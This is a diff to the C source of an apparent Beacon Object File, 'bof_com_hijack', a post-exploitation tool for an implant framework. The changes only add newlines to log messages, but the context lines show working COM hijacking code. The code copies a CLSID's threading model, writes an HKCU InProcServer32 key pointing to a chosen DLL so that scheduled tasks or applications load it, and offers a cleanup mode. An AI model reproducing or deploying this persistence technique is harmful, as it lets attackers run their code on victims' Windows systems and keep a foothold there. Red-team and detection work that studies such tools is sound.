@@ -43,7 +43,7 @@ extern "C" {
 
 	BOOL IsValidClsid(LPCSTR clsId) {
 		if (!clsId) {
-			BeaconPrintf(CALLBACK_ERROR, "[!] CLSID is NULL");
+			BeaconPrintf(CALLBACK_ERROR, "[!] CLSID is NULL\n");
 			return FALSE;
 		}
 
@@ -55,7 +55,7 @@ extern "C" {
 			offset = 1;
 		}
 		else if (len != 36) {
-			BeaconPrintf(CALLBACK_ERROR, "[!] Invalid CLSID length: %d (expected 36 or 38)", len);
+			BeaconPrintf(CALLBACK_ERROR, "[!] Invalid CLSID length: %d (expected 36 or 38)\n", len);
 			return FALSE;
 		}
 
@@ -64,13 +64,13 @@ extern "C" {
 
 			if (i == 8 || i == 13 || i == 18 || i == 23) {
 				if (c != '-') {
-					BeaconPrintf(CALLBACK_ERROR, "[!] Invalid CLSID format: missing dash at position %d", i);
+					BeaconPrintf(CALLBACK_ERROR, "[!] Invalid CLSID format: missing dash at position %d\n", i);
 					return FALSE;
 				}
 			}
 			else {
 				if (!isxdigit((unsigned char)c)) {
-					BeaconPrintf(CALLBACK_ERROR, "[!] Invalid CLSID format: non-hex character '%c' at position %d", c, i);
+					BeaconPrintf(CALLBACK_ERROR, "[!] Invalid CLSID format: non-hex character '%c' at position %d\n", c, i);
 					return FALSE;
 				}
 			}
@@ -81,7 +81,7 @@ extern "C" {
 
 	BOOL ClsidExists(HKEY root, LPCSTR clsId) {
 		if (!clsId) {
-			BeaconPrintf(CALLBACK_ERROR, "[!] CLSID is NULL");
+			BeaconPrintf(CALLBACK_ERROR, "[!] CLSID is NULL\n");
 			return FALSE;
 		}
 
@@ -107,7 +107,7 @@ extern "C" {
 		}
 
 		if (status != ERROR_FILE_NOT_FOUND) {
-			BeaconPrintf(CALLBACK_OUTPUT, "[*] RegOpenKeyExA returned unexpected error: %d", status);
+			BeaconPrintf(CALLBACK_OUTPUT, "[*] RegOpenKeyExA returned unexpected error: %d\n", status);
 		}
 
 		return FALSE;
@@ -154,13 +154,13 @@ extern "C" {
 
 	BOOL Hijack(LPCSTR dllPath, LPCSTR clsId) {
 		if (!dllPath || !clsId) {
-			BeaconPrintf(CALLBACK_ERROR, "[!] NULL parameter passed to Hijack()");
+			BeaconPrintf(CALLBACK_ERROR, "[!] NULL parameter passed to Hijack()\n");
 			return FALSE;
 		}
 
-		BeaconPrintf(CALLBACK_OUTPUT, "");
-		BeaconPrintf(CALLBACK_OUTPUT, " COM Hijacking");
-		BeaconPrintf(CALLBACK_OUTPUT, "");
+		BeaconPrintf(CALLBACK_OUTPUT, "\n");
+		BeaconPrintf(CALLBACK_OUTPUT, " COM Hijacking\n");
+		BeaconPrintf(CALLBACK_OUTPUT, "\n");
 
 		CHAR hklmInProc[256];
 		CHAR hkcuInproc[256];
@@ -176,15 +176,15 @@ extern "C" {
 			clsId
 		);
 
-		BeaconPrintf(CALLBACK_OUTPUT, "[*] Target CLSID: %s", clsId);
-		BeaconPrintf(CALLBACK_OUTPUT, "[*] HKLM Key:     %s", hklmInProc);
-		BeaconPrintf(CALLBACK_OUTPUT, "[*] HKCU Key:     %s", hkcuInproc);
-		BeaconPrintf(CALLBACK_OUTPUT, "[*] Hijack DLL:   %s", dllPath);
-		BeaconPrintf(CALLBACK_OUTPUT, "");
+		BeaconPrintf(CALLBACK_OUTPUT, "[*] Target CLSID: %s\n", clsId);
+		BeaconPrintf(CALLBACK_OUTPUT, "[*] HKLM Key:     %s\n", hklmInProc);
+		BeaconPrintf(CALLBACK_OUTPUT, "[*] HKCU Key:     %s\n", hkcuInproc);
+		BeaconPrintf(CALLBACK_OUTPUT, "[*] Hijack DLL:   %s\n", dllPath);
+		BeaconPrintf(CALLBACK_OUTPUT, "\n");
 
 		CHAR legitDll[512] = { 0 };
 		if (GetLegitDllPath(clsId, legitDll, sizeof(legitDll))) {
-			BeaconPrintf(CALLBACK_OUTPUT, "[*] Legitimate DLL: %s", legitDll);
+			BeaconPrintf(CALLBACK_OUTPUT, "[*] Legitimate DLL: %s\n", legitDll);
 		}
 
 		HKEY hKeyHKLM = NULL;
@@ -201,7 +201,7 @@ extern "C" {
 		);
 
 		if (status != ERROR_SUCCESS) {
-			BeaconPrintf(CALLBACK_ERROR, "[!] Failed to open HKLM InProcServer32: %d", status);
+			BeaconPrintf(CALLBACK_ERROR, "[!] Failed to open HKLM InProcServer32: %d\n", status);
 			return FALSE;
 		}
 
@@ -218,14 +218,14 @@ extern "C" {
 
 		if (status == ERROR_FILE_NOT_FOUND) {
 			wsprintfA(threadingModel, "Apartment");
-			BeaconPrintf(CALLBACK_OUTPUT, "[*] ThreadingModel not set in HKLM, using default: %s", threadingModel);
+			BeaconPrintf(CALLBACK_OUTPUT, "[*] ThreadingModel not set in HKLM, using default: %s\n", threadingModel);
 		}
 		else if (status != ERROR_SUCCESS || type != REG_SZ) {
-			BeaconPrintf(CALLBACK_ERROR, "[!] Failed to read ThreadingModel from HKLM: %d", status);
+			BeaconPrintf(CALLBACK_ERROR, "[!] Failed to read ThreadingModel from HKLM: %d\n", status);
 			return FALSE;
 		}
 		else {
-			BeaconPrintf(CALLBACK_OUTPUT, "[*] ThreadingModel: %s", threadingModel);
+			BeaconPrintf(CALLBACK_OUTPUT, "[*] ThreadingModel: %s\n", threadingModel);
 		}
 
 		BeaconPrintf(CALLBACK_OUTPUT, "");
@@ -233,7 +233,7 @@ extern "C" {
 		HKEY hKeyHKCU = NULL;
 		DWORD disposition;
 
-		BeaconPrintf(CALLBACK_OUTPUT, "[*] Step 1: Creating HKCU InProcServer32 key...");
+		BeaconPrintf(CALLBACK_OUTPUT, "[*] Step 1: Creating HKCU InProcServer32 key...\n");
 		status = RegCreateKeyExA(
 			HKEY_CURRENT_USER,
 			hkcuInproc,
@@ -247,18 +247,18 @@ extern "C" {
 		);
 
 		if (status != ERROR_SUCCESS) {
-			BeaconPrintf(CALLBACK_ERROR, "[!] Failed to create HKCU InProcServer32: %d", status);
+			BeaconPrintf(CALLBACK_ERROR, "[!] Failed to create HKCU InProcServer32: %d\n", status);
 			return FALSE;
 		}
 
 		if (disposition == REG_CREATED_NEW_KEY) {
-			BeaconPrintf(CALLBACK_OUTPUT, "[+] Created new registry key");
+			BeaconPrintf(CALLBACK_OUTPUT, "[+] Created new registry key\n");
 		}
 		else if (disposition == REG_OPENED_EXISTING_KEY) {
-			BeaconPrintf(CALLBACK_OUTPUT, "[+] Opened existing registry key");
+			BeaconPrintf(CALLBACK_OUTPUT, "[+] Opened existing registry key\n");
 		}
 
-		BeaconPrintf(CALLBACK_OUTPUT, "[*] Step 2: Setting DLL path...");
+		BeaconPrintf(CALLBACK_OUTPUT, "[*] Step 2: Setting DLL path...\n");
 		status = RegSetValueExA(
 			hKeyHKCU,
 			NULL,
@@ -269,14 +269,14 @@ extern "C" {
 		);
 
 		if (status != ERROR_SUCCESS) {
-			BeaconPrintf(CALLBACK_ERROR, "[!] Failed to set default DLL path: %d", status);
+			BeaconPrintf(CALLBACK_ERROR, "[!] Failed to set default DLL path: %d\n", status);
 			RegCloseKey(hKeyHKCU);
 			return FALSE;
 		}
-		BeaconPrintf(CALLBACK_OUTPUT, "[+] DLL path set successfully");
+		BeaconPrintf(CALLBACK_OUTPUT, "[+] DLL path set successfully\n");
 
 		// Set ThreadingModel
-		BeaconPrintf(CALLBACK_OUTPUT, "[*] Step 3: Setting ThreadingModel...");
+		BeaconPrintf(CALLBACK_OUTPUT, "[*] Step 3: Setting ThreadingModel...\n");
 		status = RegSetValueExA(
 			hKeyHKCU,
 			"ThreadingModel",
@@ -287,34 +287,34 @@ extern "C" {
 		);
 
 		if (status != ERROR_SUCCESS) {
-			BeaconPrintf(CALLBACK_ERROR, "[!] Failed to set ThreadingModel: %d", status);
+			BeaconPrintf(CALLBACK_ERROR, "[!] Failed to set ThreadingModel: %d\n", status);
 			RegCloseKey(hKeyHKCU);
 			return FALSE;
 		}
-		BeaconPrintf(CALLBACK_OUTPUT, "[+] ThreadingModel set successfully");
+		BeaconPrintf(CALLBACK_OUTPUT, "[+] ThreadingModel set successfully\n");
 
 		RegCloseKey(hKeyHKCU);
 
-		BeaconPrintf(CALLBACK_OUTPUT, "");
-		BeaconPrintf(CALLBACK_OUTPUT, "[+] COM Hijacking completed!");
-		BeaconPrintf(CALLBACK_OUTPUT, "");
-		BeaconPrintf(CALLBACK_OUTPUT, "[!] The hijack will trigger when:");
-		BeaconPrintf(CALLBACK_OUTPUT, "    - The associated scheduled task runs");
-		BeaconPrintf(CALLBACK_OUTPUT, "    - An application instantiates this COM object");
-		BeaconPrintf(CALLBACK_OUTPUT, "");
+		BeaconPrintf(CALLBACK_OUTPUT, "\n");
+		BeaconPrintf(CALLBACK_OUTPUT, "[+] COM Hijacking completed!\n");
+		BeaconPrintf(CALLBACK_OUTPUT, "\n");
+		BeaconPrintf(CALLBACK_OUTPUT, "[!] The hijack will trigger when:\n");
+		BeaconPrintf(CALLBACK_OUTPUT, "    - The associated scheduled task runs\n");
+		BeaconPrintf(CALLBACK_OUTPUT, "    - An application instantiates this COM object\n");
+		BeaconPrintf(CALLBACK_OUTPUT, "\n");
 
 		return TRUE;
 	}
 
 	BOOL Delete(LPCSTR clsId) {
 		if (!clsId) {
-			BeaconPrintf(CALLBACK_ERROR, "[!] CLSID is NULL");
+			BeaconPrintf(CALLBACK_ERROR, "[!] CLSID is NULL\n");
 			return FALSE;
 		}
 
-		BeaconPrintf(CALLBACK_OUTPUT, "");
-		BeaconPrintf(CALLBACK_OUTPUT, " Deleting COM Object");
-		BeaconPrintf(CALLBACK_OUTPUT, "");
+		BeaconPrintf(CALLBACK_OUTPUT, "\n");
+		BeaconPrintf(CALLBACK_OUTPUT, " Deleting COM Object\n");
+		BeaconPrintf(CALLBACK_OUTPUT, "\n");
 
 		CHAR hkcuClsid[256];
 		CHAR hkcuInproc[256];
@@ -331,9 +331,9 @@ extern "C" {
 			hkcuClsid
 		);
 
-		BeaconPrintf(CALLBACK_OUTPUT, "[*] Target CLSID: %s", clsId);
-		BeaconPrintf(CALLBACK_OUTPUT, "[*] HKCU Key:     %s", hkcuInproc);
-		BeaconPrintf(CALLBACK_OUTPUT, "");
+		BeaconPrintf(CALLBACK_OUTPUT, "[*] Target CLSID: %s\n", clsId);
+		BeaconPrintf(CALLBACK_OUTPUT, "[*] HKCU Key:     %s\n", hkcuInproc);
+		BeaconPrintf(CALLBACK_OUTPUT, "\n");
 
 		HKEY hKey = NULL;
 		LONG status = RegOpenKeyExA(
@@ -345,7 +345,7 @@ extern "C" {
 		);
 
 		if (status != ERROR_SUCCESS) {
-			BeaconPrintf(CALLBACK_ERROR, "[!] No hijack found (InProcServer32 missing): %d", status);
+			BeaconPrintf(CALLBACK_ERROR, "[!] No hijack found (InProcServer32 missing): %d\n", status);
 			return FALSE;
 		}
 
@@ -365,57 +365,57 @@ extern "C" {
 		RegCloseKey(hKey);
 
 		if (status == ERROR_SUCCESS && type == REG_SZ) {
-			BeaconPrintf(CALLBACK_OUTPUT, "[*] Current hijacked DLL: %s", dllPath);
+			BeaconPrintf(CALLBACK_OUTPUT, "[*] Current hijacked DLL: %s\n", dllPath);
 		}
 		else {
-			BeaconPrintf(CALLBACK_OUTPUT, "[*] Could not read current DLL value: %d", status);
+			BeaconPrintf(CALLBACK_OUTPUT, "[*] Could not read current DLL value: %d\n", status);
 		}
 
-		BeaconPrintf(CALLBACK_OUTPUT, "");
+		BeaconPrintf(CALLBACK_OUTPUT, "\n");
 
-		BeaconPrintf(CALLBACK_OUTPUT, "[*] Step 1: Deleting InProcServer32 key...");
+		BeaconPrintf(CALLBACK_OUTPUT, "[*] Step 1: Deleting InProcServer32 key...\n");
 		status = RegDeleteTreeA(
 			HKEY_CURRENT_USER,
 			hkcuInproc
 		);
 
 		if (status == ERROR_SUCCESS) {
-			BeaconPrintf(CALLBACK_OUTPUT, "[+] InProcServer32 key deleted successfully");
+			BeaconPrintf(CALLBACK_OUTPUT, "[+] InProcServer32 key deleted successfully\n");
 		}
 		else if (status == ERROR_FILE_NOT_FOUND) {
-			BeaconPrintf(CALLBACK_OUTPUT, "[*] InProcServer32 key not found (already deleted?)");
+			BeaconPrintf(CALLBACK_OUTPUT, "[*] InProcServer32 key not found (already deleted?)\n");
 		}
 		else {
-			BeaconPrintf(CALLBACK_ERROR, "[!] Failed to delete InProcServer32: %d", status);
+			BeaconPrintf(CALLBACK_ERROR, "[!] Failed to delete InProcServer32: %d\n", status);
 			return FALSE;
 		}
 
-		BeaconPrintf(CALLBACK_OUTPUT, "[*] Step 2: Deleting CLSID key...");
+		BeaconPrintf(CALLBACK_OUTPUT, "[*] Step 2: Deleting CLSID key...\n");
 		status = RegDeleteKeyA(
 			HKEY_CURRENT_USER,
 			hkcuClsid
 		);
 
 		if (status == ERROR_SUCCESS) {
-			BeaconPrintf(CALLBACK_OUTPUT, "[+] CLSID key deleted successfully");
+			BeaconPrintf(CALLBACK_OUTPUT, "[+] CLSID key deleted successfully\n");
 		}
 		else if (status == ERROR_FILE_NOT_FOUND) {
-			BeaconPrintf(CALLBACK_OUTPUT, "[*] CLSID key not found (already deleted?)");
+			BeaconPrintf(CALLBACK_OUTPUT, "[*] CLSID key not found (already deleted?)\n");
 		}
 		else {
-			BeaconPrintf(CALLBACK_ERROR, "[!] Failed to delete CLSID key: %d", status);
+			BeaconPrintf(CALLBACK_ERROR, "[!] Failed to delete CLSID key: %d\n", status);
 			return FALSE;
 		}
 
-		BeaconPrintf(CALLBACK_OUTPUT, "");
-		BeaconPrintf(CALLBACK_OUTPUT, "[+] Deleted COM Object");
-		BeaconPrintf(CALLBACK_OUTPUT, "");
+		BeaconPrintf(CALLBACK_OUTPUT, "\n");
+		BeaconPrintf(CALLBACK_OUTPUT, "[+] Deleted COM Object\n");
+		BeaconPrintf(CALLBACK_OUTPUT, "\n");
 
 		if (status == ERROR_SUCCESS && dllPath[0] != '\0') {
-			BeaconPrintf(CALLBACK_OUTPUT, "[*] Manually delete if needed:");
-			BeaconPrintf(CALLBACK_OUTPUT, "    del \"%s\"", dllPath);
+			BeaconPrintf(CALLBACK_OUTPUT, "[*] Manually delete if needed:\n");
+			BeaconPrintf(CALLBACK_OUTPUT, "    del \"%s\"\n", dllPath);
 		}
-		BeaconPrintf(CALLBACK_OUTPUT, "");
+		BeaconPrintf(CALLBACK_OUTPUT, "\n");
 
 		return TRUE;
 	}
@@ -423,15 +423,15 @@ extern "C" {
 	BOOL HijackMode(LPCSTR dllPath, LPCSTR clsId) {
 		BOOL inHKLM = ClsidExists(HKEY_LOCAL_MACHINE, clsId);
 		if (!inHKLM) {
-			BeaconPrintf(CALLBACK_ERROR, "[!] CLSID not found in HKLM");
-			BeaconPrintf(CALLBACK_ERROR, "[!] This CLSID may not be hijackable or doesn't exist");
+			BeaconPrintf(CALLBACK_ERROR, "[!] CLSID not found in HKLM\n");
+			BeaconPrintf(CALLBACK_ERROR, "[!] This CLSID may not be hijackable or doesn't exist\n");
 			return FALSE;
 		}
 
 		BOOL inHKCU = ClsidExists(HKEY_CURRENT_USER, clsId);
 		if (inHKCU) {
-			BeaconPrintf(CALLBACK_ERROR, "[!] CLSID already present in HKCU");
-			BeaconPrintf(CALLBACK_ERROR, "[!] Run in delete mode first to remove existing hijack");
+			BeaconPrintf(CALLBACK_ERROR, "[!] CLSID already present in HKCU\n");
+			BeaconPrintf(CALLBACK_ERROR, "[!] Run in delete mode first to remove existing hijack\n");
 			return FALSE;
 		}
 
@@ -441,8 +441,8 @@ extern "C" {
 	BOOL DeleteMode(LPCSTR clsId) {
 		BOOL inHKCU = ClsidExists(HKEY_CURRENT_USER, clsId);
 		if (!inHKCU) {
-			BeaconPrintf(CALLBACK_ERROR, "[!] CLSID not present in HKCU");
-			BeaconPrintf(CALLBACK_ERROR, "[!] No hijack found to remove");
+			BeaconPrintf(CALLBACK_ERROR, "[!] CLSID not present in HKCU\n");
+			BeaconPrintf(CALLBACK_ERROR, "[!] No hijack found to remove\n");
 			return FALSE;
 		}
 
@@ -457,10 +457,10 @@ extern "C" {
 		INT32 modeLen, dllLen = 0, clsIdLen;
 
 		if (!args || len == 0) {
-			BeaconPrintf(CALLBACK_ERROR, "[!] No arguments provided");
-			BeaconPrintf(CALLBACK_ERROR, "Usage:");
-			BeaconPrintf(CALLBACK_ERROR, "  Hijack: bof_com_hijack hijack <dll_path> <clsid>");
-			BeaconPrintf(CALLBACK_ERROR, "  Delete: bof_com_hijack delete <clsid>");
+			BeaconPrintf(CALLBACK_ERROR, "[!] No arguments provided\n");
+			BeaconPrintf(CALLBACK_ERROR, "Usage:\n");
+			BeaconPrintf(CALLBACK_ERROR, "  Hijack: bof_com_hijack hijack <dll_path> <clsid>\n");
+			BeaconPrintf(CALLBACK_ERROR, "  Delete: bof_com_hijack delete <clsid>\n");
 			return;
 		}
 
@@ -468,8 +468,8 @@ extern "C" {
 		mode = BeaconDataExtract(&parser, &modeLen);
 
 		if (mode == NULL || modeLen == 0) {
-			BeaconPrintf(CALLBACK_ERROR, "[!] No mode provided");
-			BeaconPrintf(CALLBACK_ERROR, "Usage: hijack or delete");
+			BeaconPrintf(CALLBACK_ERROR, "[!] No mode provided\n");
+			BeaconPrintf(CALLBACK_ERROR, "Usage: hijack or delete\n");
 			return;
 		}
 
@@ -478,14 +478,14 @@ extern "C" {
 			clsId = BeaconDataExtract(&parser, &clsIdLen);
 
 			if (dllPath == NULL || dllLen == 0) {
-				BeaconPrintf(CALLBACK_ERROR, "[!] Hijack mode requires a DLL path");
-				BeaconPrintf(CALLBACK_ERROR, "Usage: bof_com_hijack hijack <dll_path> <clsid>");
+				BeaconPrintf(CALLBACK_ERROR, "[!] Hijack mode requires a DLL path\n");
+				BeaconPrintf(CALLBACK_ERROR, "Usage: bof_com_hijack hijack <dll_path> <clsid>\n");
 				return;
 			}
 
 			if (clsId == NULL || clsIdLen == 0) {
-				BeaconPrintf(CALLBACK_ERROR, "[!] Hijack mode requires a CLSID");
-				BeaconPrintf(CALLBACK_ERROR, "Usage: bof_com_hijack hijack <dll_path> <clsid>");
+				BeaconPrintf(CALLBACK_ERROR, "[!] Hijack mode requires a CLSID\n");
+				BeaconPrintf(CALLBACK_ERROR, "Usage: bof_com_hijack hijack <dll_path> <clsid>\n");
 				return;
 			}
 
@@ -495,26 +495,26 @@ extern "C" {
 
 			DWORD dllAttr = GetFileAttributesA(dllPath);
 			if (dllAttr == INVALID_FILE_ATTRIBUTES) {
-				BeaconPrintf(CALLBACK_ERROR, "[!] DLL not found: %s", dllPath);
-				BeaconPrintf(CALLBACK_ERROR, "[!] Error code: %d", GetLastError());
+				BeaconPrintf(CALLBACK_ERROR, "[!] DLL not found: %s\n", dllPath);
+				BeaconPrintf(CALLBACK_ERROR, "[!] Error code: %d\n", GetLastError());
 				return;
 			}
 
 			if (dllAttr & FILE_ATTRIBUTE_DIRECTORY) {
-				BeaconPrintf(CALLBACK_ERROR, "[!] Path is a directory, not a DLL: %s", dllPath);
+				BeaconPrintf(CALLBACK_ERROR, "[!] Path is a directory, not a DLL: %s\n", dllPath);
 				return;
 			}
 
 			if (!HijackMode(dllPath, clsId)) {
-				BeaconPrintf(CALLBACK_ERROR, "[!] Hijack mode failed");
+				BeaconPrintf(CALLBACK_ERROR, "[!] Hijack mode failed\n");
 			}
 		}
 		else if (strcmp(mode, "delete") == 0) {
 			clsId = BeaconDataExtract(&parser, &clsIdLen);
 
 			if (clsId == NULL || clsIdLen == 0) {
-				BeaconPrintf(CALLBACK_ERROR, "[!] Delete mode requires a CLSID");
-				BeaconPrintf(CALLBACK_ERROR, "Usage: bof_com_hijack delete <clsid>");
+				BeaconPrintf(CALLBACK_ERROR, "[!] Delete mode requires a CLSID\n");
+				BeaconPrintf(CALLBACK_ERROR, "Usage: bof_com_hijack delete <clsid>\n");
 				return;
 			}
 
@@ -523,12 +523,12 @@ extern "C" {
 			}
 
 			if (!DeleteMode(clsId)) {
-				BeaconPrintf(CALLBACK_ERROR, "[!] Delete mode failed");
+				BeaconPrintf(CALLBACK_ERROR, "[!] Delete mode failed\n");
 			}
 		}
 		else {
-			BeaconPrintf(CALLBACK_ERROR, "[!] Unknown mode: %s", mode);
-			BeaconPrintf(CALLBACK_ERROR, "Valid modes: hijack, delete");
+			BeaconPrintf(CALLBACK_ERROR, "[!] Unknown mode: %s\n", mode);
+			BeaconPrintf(CALLBACK_ERROR, "Valid modes: hijack, delete\n");
 		}
 	}
 }
